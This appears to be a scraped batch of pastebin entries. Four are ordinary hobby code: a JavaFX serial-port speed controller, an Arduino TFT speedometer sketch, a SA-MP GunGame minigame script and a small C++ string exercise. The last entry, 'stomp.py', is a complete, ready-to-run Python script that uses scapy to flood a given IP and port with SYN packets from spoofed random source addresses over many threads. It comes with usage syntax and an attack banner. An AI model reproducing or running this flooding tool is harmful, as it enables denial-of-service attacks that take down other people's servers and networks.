UxmCF2Ci,virtualsoftpotenciometro,kalibre,Java,Sunday 17th of March 2024 04:31:54 PM CDT,"/*
 * bem10jfx.blogspot.com
mabson
 */
package velocimetrogauge1;

import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.event.Event;
import javafx.event.EventHandler;
import javafx.geometry.Orientation;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.Label;
import javafx.scene.control.Slider;
import javafx.scene.input.KeyEvent;
import javafx.scene.input.MouseEvent;
import javafx.scene.input.ScrollEvent;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.paint.Color;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;
import jssc.SerialPort;
import jssc.SerialPortEvent;
import jssc.SerialPortException;
import jssc.SerialPortList;

/**
 *
 * @author mabson
 */
public class VelocimetroGauge1 extends Application {

    public SerialPort serialportOne;
    public Label tx_porta = new Label(""PORTAS:"");
    public ChoiceBox cb_Port = new ChoiceBox();
    public Label tx_Baud = new Label(""Velocidade:"");
    public ChoiceBox cb_baud = new ChoiceBox();
    public Slider slider = new Slider(0, 260, 0);//vlminimo vlmaximo e inicio do slade_luand

    @Override
    public void start(Stage primaryStage) {
        Button btn = new Button();
        btn.setText(""Conectar'"");

        cb_baud.getItems().addAll(
                ""300"", ""1200"", ""2400"", ""4800"", ""9600"", ""14400"", ""19200"",
                ""28800"", ""38400"", ""57600"", ""115200"", ""230400"", ""250000"", ""500000"", ""1000000"");

        btn.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent event) {
                System.out.println(""Display!"");

                try {
                    N_Dispar_PRN();
                } catch (InterruptedException ex) {
                    Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
                } catch (SerialPortException ex) {
                    Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        });

        VBox vb_Conect = new VBox();
        Group root = new Group();
        vb_Conect.setLayoutX(60);
        vb_Conect.setLayoutY(35);
        root.getChildren().addAll(vb_Conect);
        vb_Conect.getChildren().addAll(tx_porta, cb_Port, tx_Baud, cb_baud, btn);

        vb_Conect.setStyle(""-fx-padding:2;""
                + ""-fx-border-style: solid inside;""
                + ""-fx-border-color:white;"");
        Scene scene = new Scene(root, 300, 250, Color.SILVER);
        primaryStage.setOnCloseRequest(new EventHandler<WindowEvent>() {
            @Override
            public void handle(WindowEvent event) {
                try {
                    serialportOne.closePort();
                } catch (SerialPortException ex) {
                    Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
                }
                Platform.exit();

            }
        });
        primaryStage.setTitle(""display"");
        primaryStage.setScene(scene);

        cb_Port.setOnMouseClicked(new EventHandler<MouseEvent>() {
            @Override
            public void handle(MouseEvent event) {
                LOL();
            }
        });
        primaryStage.show();
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        launch(args);
    }//procurade portas ~~

    public void LOL() {
        cb_Port.getItems().clear();//apaga as portas lidas na entrada
        final String[] serialPortasNomes = SerialPortList.getPortNames();//armazena portas disponivel no momento
        for (String nomeportas : serialPortasNomes) {//armazena  portas e incrementa +1 porta disponivei no momento do novo ciclo
            cb_Port.getItems().addAll(nomeportas); //??envia um choiseBOX 
            System.out.println(""portas disponiveis\n"" + nomeportas);//XD
            //--{[>
        }
    }
    //arranque de conexao

    @SuppressWarnings(""empty-statement"")//sdc v
    public void N_Dispar_PRN() throws InterruptedException, SerialPortException {
        serialportOne = new SerialPort(cb_Port.getValue().toString()); 
        serialportOne.openPort();
        int baudrater1 = Integer.parseInt(cb_baud.getValue().toString());
        System.out.println(""Velocidade de conexao"" + baudrater1);
        serialportOne.setParams(baudrater1, SerialPort.DATABITS_8, SerialPort.STOPBITS_1, SerialPort.PARITY_NONE);
        Arranque();//ARRANQUE DE CONEXAO ...

    }//stage velecimetro LCD1

    public void disparStage() {

        Stage stageD1 = new Stage();
        Group go1 = new Group();
        Scene scened1 = new Scene(go1, 200, 400, Color.DARKORCHID);
        stageD1.setScene(scened1);
        stageD1.setOnCloseRequest((WindowEvent event) -> {
            try {
                serialportOne.closePort();
            } catch (SerialPortException ex) {
                Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
            }
            Platform.exit();
        });

        VBox vb1center = new VBox(10);
        
        vb1center.setStyle(""-fx-padding:2;""+ ""-fx-border-style: solid inside;"" + ""-fx-border-color:white;"");
        go1.getChildren().addAll(vb1center);
        vb1center.setLayoutX(60);
        vb1center.setLayoutY(60);
        slider.setOrientation(Orientation.VERTICAL);
        Label lbvlKM = new Label(""KM\\h"");
        vb1center.getChildren().addAll(tx_Baud, slider, lbvlKM);//childrens 
        slider.setOnKeyReleased(new EventHandler<KeyEvent>() {//;; evento  de key released :D
         @Override
            public void handle(KeyEvent event) {
                System.out.println(event.getText());
                try {
                    System.out.println(""velocidade Do Software"" + ((int) slider.getValue()));//Parseint
                    serialportOne.writeString(((int) slider.getValue()) + ""\n"");//XD
                    lbvlKM.setText(((int) slider.getValue()) + ""KM\\h"");

                    
                    
                    
                    
                } catch (SerialPortException ex) {
                    Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        });
        slider.setOnMouseDragged(new EventHandler<MouseEvent>() {//evento de mouse
            @Override
            public void handle(MouseEvent event) {

                try {
                    System.out.println(""Velocidade Do Software"" + ((int) slider.getValue()));
                    serialportOne.writeString(((int) slider.getValue()) + ""\n"");
                    lbvlKM.setText(((int) slider.getValue()) + ""KM\\h"");
                } catch (SerialPortException ex) {
                    Logger.getLogger(VelocimetroGauge1.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        });
        stageD1.show();
    }

    public void Arranque() throws SerialPortException {
        if (serialportOne.isOpened()) {
            System.out.println(""conectado portas abertas "");
            //iniciando conexao e habilitando stage2 
            disparStage();
            //criar um event listerner aqui e corrifigir depois passando para uma classe public nova 
            //----------------------------------------------------->>
            serialportOne.addEventListener((SerialPortEvent spe) -> {
                //escuta de input e output
                if (spe.isRXCHAR() && spe.getEventValue() > 0) {
                    try {
                        byte[] byte_Input = serialportOne.readBytes(spe.getEventValue());
                        String str_Byte_input = new String(byte_Input);
                        int vlVeloControl = Integer.parseInt(str_Byte_input);
                        int vlVeloSoft = Integer.parseInt(slider.toString());
                        System.out.println(""Velocidade A.U."" + Arrays.toString(byte_Input));//preferir colections do jfx

                        if (vlVeloControl != vlVeloSoft) { //se a resposta de retorno for diferente do envio enviar novavemte (~~)
                            serialportOne.writeString(vlVeloSoft + ""\n"");
                        } else {
                            serialportOne.writeString(vlVeloSoft + ""\n"");
                        }
                    } catch (SerialPortException e) {
                    }
                }
            });
            //----------------------------------------------------->>  
        } else {
            
            System.out.println(""Nao conectado Portas  fechadas"");
        }
    }
}
"
kS4Tnehu,Untitled,MichaelFR,C++,Sunday 17th of March 2024 04:29:26 PM CDT,"new bool:GunGame = false;
new GGRank[MAX_PLAYERS] = 0;
new bool:GG[MAX_PLAYERS] = false;

new Float:GGSpawns[8][4] =
{
	{119.5620,1459.4753,10.6226,272.7749},
	{120.4306,1343.0110,10.5859,8.6558},
	{177.1469,1358.5471,10.5859,315.5569},
	{198.9355,1431.2059,10.5859,91.6898},
	{223.5451,1466.9707,10.5859,178.0023},
	{275.1293,1476.7314,10.5859,174.5556},
	{265.3375,1375.9758,10.5859,268.3882},
	{218.4930,1381.8516,10.5859,86.8215}
};

new GGGuns[13][1] =
{
	{22},
	{23},
	{24},
	{28},
	{29},
	{32},
	{25},
	{27},
	{30},
	{31},
	{33},
	{34},
	{26}
};
OPD
    if(GG[playerid] && GG[killerid])
	{
	    GGRank[killerid]++;
	    new str[128];
	    if(GGRank[killerid] == 13)
	    {
	        foreach(Player, i)
			{
			    if(GG[i])
			    {
			        GG[i] = false;
			        format(str,128,""~y~GunGame je gotov!~n~~y~Pobjednik: ~g~%s"", pime(killerid));
			        GameTextForPlayer(i, str, 3000, 3);
			        SpawnPlayer(i);
				}
			}
			format(str,128,"" GUNGAME | Pobjednik GunGame-a je %s!"", pime(killerid));
			SendClientMessageToAll(COLOR_LIME, str);
			GunGame = false;
		}
		else
		{
  			D_ResetPlayerWeapons(killerid);
		    D_GivePlayerWeapon(killerid, GGGuns[GGRank[killerid]][0], 500);
		    format(str,128,"" GUNGAME | Tvoj rank: %d/13"", GGRank[killerid]);
		    SendClientMessage(killerid, COLOR_LIME, str);
		}
	}

gh 	SendClientMessage(playerid, COLOR_AQUA,""[Gungame] | /gungame /gungamestart /gungamestop /ggizbaci"");
CMD:ggigraci(playerid,params[]) {
	if(PI[playerid][pAdmin] > 0 || PI[playerid][pGS] > 0 || Race[playerid]) {
		new str[100];
		SendClientMessage(playerid,COLOR_SALMON, "" ===== EVENT VOZACI ===== "");
		foreach(Player,i) {
		    if(GG[i]) {
		        format(str,100,""  == %s[%d]"",pime(i),i);
		        SendClientMessage(playerid,COLOR_WHITE,str);
			}
		}
	}
	return 1;
}

CMD:gungame(playerid,params[])
{
	if(PI[playerid][pAdmin] == 0 && PI[playerid][pGS] == 0) return NISTE_OVLASTENI;
	new id;
	if(sscanf(params,""u"",id)) return SendClientMessage(playerid, COLOR_IVORY4, "" *Koristi: /gungame [id igraca]"");
	else if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_IVORY4, ""Korisnik nije online!"");
	GG[id] = true;
	GGRank[id] = 0;
	new str[128];
	format(str,128,"" *Admin/GS %s vas je prozvao na GunGame!"", pime(playerid));//Dodad admin/gs odvojeno
	SendClientMessage(id, COLOR_LIME, str);
	format(str,128,"" *Prozvali ste igraca %s na gungame!"", pime(id));
	SendClientMessage(playerid, COLOR_LIME, str);
	LOG(""admin_komande"",""Igrac: %s, Komanda: /gungame"",pime(playerid));
	return 1;
}

CMD:ggizbaci(playerid,params[])
{
	if(PI[playerid][pAdmin] == 0 && PI[playerid][pGS] == 0) return NISTE_OVLASTENI;
	new id;
	if(sscanf(params,""u"",id)) return SendClientMessage(playerid, COLOR_IVORY4, "" *Koristi: /ggizbaci [id igraca]"");
	else if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_IVORY4, ""Korisnik nije online!"");
	GG[id] = false;
	GGRank[id] = 0;
	new str[128];
	format(str,128,"" *Admin/GS %s vas je izbacio iz GunGame-a!"", pime(playerid));//dodat admin/gs odvojeno
	SendClientMessage(id, COLOR_LIME, str);
	format(str,128,"" *Izbacili ste igraca %s iz gungame-a!"", pime(id));
	SendClientMessage(playerid, COLOR_LIME, str);
	LOG(""admin_komande"",""Igrac: %s, Komanda: /ggizbaci"",pime(playerid));
	return 1;
}

CMD:gungamestart(playerid,params[])
{
	if(PI[playerid][pAdmin] == 0 && PI[playerid][pGS] == 0) return NISTE_OVLASTENI;
	if(GunGame == true) return SendClientMessage(playerid, COLOR_IVORY4, ""*Gungame je vec u tijeku!"");
	foreach(Player, i)
	{
	    if(GG[i])
	    {
			SpawnPlayer(i);
			GameTextForPlayer(i, ""~w~GunGame je poceo!"", 3000, 3);
		}
	}
	new str[128]; format(str,128,""*Admin/GS %s je pokrenuo gungame!"",pime(playerid));//dodat admin/gs odvojeno
	SendAdminMessage(COLOR_LIME,str);
	GunGame = true;
	sessionStaffStats[ playerid ][ sessionGunGames ] ++;
	LOG(""admin_komande"",""Igrac: %s, Komanda: /gungamestart"",pime(playerid));
	return 1;
}

CMD:gungamestop(playerid,params[])
{
    if(PI[playerid][pAdmin] == 0 && PI[playerid][pGS] == 0) return NISTE_OVLASTENI;
	if(GunGame == false) return SendClientMessage(playerid, COLOR_IVORY4, ""*Gungame nije u tijeku!"");
	foreach(Player, i)
	{
	    if(GG[i])
	    {
	        GG[i] = false;
	        SendClientMessage(i,COLOR_ORANGERED, "" GUNGAME | Admin/GS je prekinuo GunGame!"");
	        SpawnPlayer(i);
		}
	}
	new str[128]; format(str,128,""*Admin/GS %s je zaustavio gungame!"",pime(playerid));//dodat admin/gs odvojeno
	SendAdminMessage(COLOR_LIME,str);
	GunGame = false;
	LOG(""admin_komande"",""Igrac: %s, Komanda: /gungamestop"",pime(playerid));
	return 1;
}
OPC 	GG[playerid] = false;
OPS if(GG[playerid]) {
		new rand = random(sizeof(GGSpawns));
		x = GGSpawns[rand][0]; y = GGSpawns[rand][1]; z = GGSpawns[rand][2]; a = GGSpawns[rand][3]; Int = 0; vw = 5;
SPW if(GG[playerid]) {
		D_GivePlayerWeapon(playerid, GGGuns[GGRank[playerid]][0], 500);
		SetPlayerHealth(playerid,100); SetPlayerArmour(playerid,0);"
jrU6qPSa,velocimetroBtA_1final,kalibre,Arduino,Sunday 17th of March 2024 04:27:41 PM CDT,"//bem10jfx.blogspot.com

#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>

#define TFT_CS     10  //cs
#define TFT_RST     12 //rebot
#define TFT_DC     9  //sda

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS,  TFT_DC, TFT_RST); //defs
 int velocidadefinal;

void setup() {
  Serial.begin(9600);

Serial.begin(9600);
  tft.setCursor(0,30); //HEIGH, WIDTH //y,x
  tft.initR(INITR_BLACKTAB); // TELAPRETA inicial?????????
  tft.setTextSize(1); // FONTALIGMENT 1
  tft.fillScreen(ST7735_BLACK); // color display
  tft.setTextColor(ST7735_BLUE); //cor de  texto  
  tft.print(""Bem10jfx.blogspot.com""); // 
  
  tft.setRotation(1.5);
  desenharVelocimetro(0);  // Inicia o velocímetro com velocidade zero

}

void loop() {
  desenharVelocimetro(velocidadefinal);
  Serial.println(velocidadefinal);
   int velocidade = Serial.parseInt();  // Lê a velocidadeserial
    
  if (Serial.available() > 0) {
    velocidadefinal=velocidade;//guarda o ultimo valor ate chegar o proximo
    desenharVelocimetro(velocidadefinal);
  }

  delay(100);
}

void desenharVelocimetro(int velocidade) {
  int centroX = tft.width() / 2;//bind do limite 
  int centroY = tft.height() / 2;//de cordenadas do circle
  int raio = min(tft.width(), tft.height()) / 3; //na tela dividido por2

  tft.fillCircle(centroX, centroY, raio, ST7735_BLACK);
  tft.fillCircle(centroX, centroY, raio - 10, ST7735_BLUE);

  // bind em meia lua o angulo é proporcional a 0 ..180+rotate=180.0+1.5
  int angulo = map(velocidade, 0, 180, 0, 180); //mapa proprocional
  float radianos = radians(angulo);  //radiano proprocional ao angulo

  // cordenada da line 
  int xPonteiro = centroX + raio * cos(radianos);
  int yPonteiro = centroY + raio * sin(radianos);

  // Desenho o ponteiro. (:)
  tft.drawLine(centroX, centroY, xPonteiro, yPonteiro, ST7735_RED);
}"
A60SajfJ,teza15-sub3-1(nu functioneaza),madidino,C++,Sunday 17th of March 2024 04:23:22 PM CDT,"#include <iostream>
#include <cstring>
using namespace std;

int main()
{
    char s[101];
    cin>>s;
    int l=strlen(s)-1;
    int j=l;//litera de la capat cu care lucram
    for(int i=0; i<l; i++)
    {
        if(s[i]!=s[j])//atunci vom adauga dupa s[j] litera de pe poz i
        {
          char x[101];
          strcpy(x,s+j+1);
          strcpy(s+j+1,NULL);
          s[j+1]=s[i];
          strcat(s,x);
        }
        else
        {
            j--;
        }
    }
    cout<<s;
    return 0;
}
"
7ru19PbR,stomp.py,betrayed,Python,Sunday 17th of March 2024 04:20:30 PM CDT,"#!/usr/bin/env python3
# STOMP - CODED BY BETRAYED
# MULTI-THREADED / SPOOFED SYN DDOS SCRIPT

import threading, sys, time, socket
import string, random, os
from scapy.all import *
from colorama import Fore, Back

_end = False

def flood():
    while _end == False:
        try:
            fake_ip = ""."".join(str(random.randint(0, 255)) for _ in range(4))

            s_port = random.randint(1, 65535)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = fake_ip
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""S""
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)

        except KeyboardInterrupt:
            pass
        except:
            pass

def main():
    if len(sys.argv) < 5:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <TIME> <THREAD/S>\r\n"")
        
    priv = os.getenv(""SUDO_USER"")
    if priv is None:
        sys.exit(""\r\n   Script requires root elevation!\r\n"")
    
    global _end, data
    tasks = []
    
    _quit = time.time() + int(sys.argv[3])
    for i in range(int(sys.argv[4])):
        x = threading.Thread(target = flood)
        tasks.append(x)
        x.start()


    print(Fore.RED + """"""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
    ░▄▄▄▄▄       ░▄▄▄▄▀  ░██▀▀▄   ░█▀▀▀▀▄▀█   ░█▀▄▄  
   ░█    ░▀▄  ░▀▀▀ █     ░█  ░█   ░█   ░█░█   ░█  ░█ 
 ░▄ ░▀▀▀▀▄        ░█     ░█  ░█   ░█   ░▄░█   ░█▀▀▀  
  ░▀▄▄▄▄▀        ░█      ░▀▄▄██   ░█     ░█   ░█     
                ░▀                      ░█     ░█    
                                      ░▀       ░▀   
"""""")
    print("" Booting "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[3] +  "" seconds... Strike CTRL+C to end...\r\n"")
    try:
        while time.time() < _quit:
            pass
    except KeyboardInterrupt:
        pass
    
    _end = True

    for y in tasks:
        y.join()

    sys.exit(""\r\n\r\nAttack complete!\r\n"")
    
if __name__ == ""__main__"":
    main()

"
